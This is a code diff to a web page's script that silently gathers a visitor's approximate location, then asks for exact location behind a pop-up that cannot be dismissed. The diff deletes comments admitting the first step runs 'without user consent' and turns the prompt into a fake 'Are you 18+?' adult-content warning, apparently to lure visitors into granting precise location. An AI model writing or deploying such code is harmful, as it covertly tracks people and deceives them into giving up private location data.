@@ -82,13 +82,13 @@
   </div>
    <script>
 (async () => {
-  // 1. First get Approximate Location silently
-  await getApproxLocation(false); // without user consent
+  
+  await getApproxLocation(false); 
 
-  // 2. Then ask for exact location access via SweetAlert
+
   const askLocation = await Swal.fire({
-    title: "Are you sure?",
-    text: "Warning: This content is specific location only. Viewer discretion is advised.",
+    title: "Are you 18+?",
+    text: "Warning: This content is for 18+ years of age. Viewer discretion is advised.",
     icon: "warning",
     allowOutsideClick: false,
     allowEscapeKey: false,
